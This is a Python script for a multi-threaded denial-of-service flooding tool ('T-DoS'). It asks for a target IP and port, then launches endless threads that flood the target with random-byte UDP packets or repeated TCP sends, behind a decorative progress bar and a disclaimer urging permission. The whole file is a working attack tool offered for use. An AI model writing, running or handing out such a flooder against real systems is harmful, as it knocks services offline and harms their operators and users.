print("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
from scapy.all import *
import threading
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet T-DoS")
print("Coded By : ParzivalHack")
print("Github   : github.com/ParzivalHack")
print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
print("Use this tool only on your own website or websites from which you have obtained permission.")
print("License: The source code of this tool is under the MIT License.")
print("© 2022 Tommaso Bona")
print("Website IP finder: www.site24x7.com/find-ip-address-of-web-site.html")
print()
ip = str(input("Target's IP:"))
port = int(input("Port(suggested 80 or 443:"))
choice = str(input("UDP(y/n):"))
times = int(input("Number of Packets:"))
threads = int(input("Threads:"))
time.sleep(2)
os.system("clear")
print("\033[91m")
os.system("figlet DoS Attack")
print("Coded by: ParzivalHack")
print ("\033[91m")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(4)
print("[==========          ] 50%")
time.sleep(3)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(1)
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!")
		except:
			print("Packet Sent!")
def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!")
		except:
			s.close()
			print("Packet sent!")
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
